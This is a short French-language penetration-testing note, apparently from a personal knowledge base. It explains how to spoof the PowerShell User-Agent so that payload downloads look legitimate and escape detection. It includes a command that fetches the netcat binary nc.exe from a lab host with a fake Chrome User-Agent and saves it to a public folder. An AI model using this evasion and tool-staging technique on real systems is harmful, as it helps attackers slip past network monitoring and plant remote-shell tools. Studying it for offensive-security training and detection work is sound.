---
public: true # set to true to make the article publishable
---

Dans un environnement ayant mis en oeuvre des mesures de sécurité, l'utilisation des User-Agents par défaut pourrait être détecté assez facilement.

Lors du téléchargement ou de l'envoie de nos payloads, il peut être utile de modifier le User-Agent pour parraître légitime.

## Powershell

```powershell
# Liste de User Agents
[Microsoft.PowerShell.Commands.PSUserAgent].GetProperties() | Select-Object Name,@{label="User Agent";Expression={[Microsoft.PowerShell.Commands.PSUserAgent]::$($_.Name)}} | fl


# Modification du User Agent d'Invoke-WebRequest
Invoke-WebRequest http://10.10.10.32/nc.exe -UserAgent [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome -OutFile "C:\Users\Public\nc.exe"
```
